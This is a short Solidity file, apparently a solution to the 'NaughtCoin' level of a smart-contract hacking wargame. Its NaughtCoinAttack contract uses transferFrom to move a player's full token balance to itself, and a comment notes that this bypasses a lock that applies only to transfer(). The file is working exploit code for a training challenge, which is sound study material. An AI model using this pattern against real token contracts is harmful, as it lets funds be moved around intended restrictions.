// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface NaughtCoin {
    function transferFrom(
        address,
        address,
        uint256
    ) external;

    function balanceOf(address) external returns (uint256);
}

contract NaughtCoinAttack {
    NaughtCoin naughtCoin =
        NaughtCoin(0xF6AF845F20Ed917e8249A28aC2eAC6cB0bDD16fe);

    function getBalance(address _player) public returns (uint256) {
        return naughtCoin.balanceOf(_player);
    }

    function attack(address _player) public {
        naughtCoin.transferFrom(
            _player,
            address(this),
            naughtCoin.balanceOf(_player)
        );
    }
}

// use approve() & transferfrom() instead transfer function
// only lockTokens used by transfer.
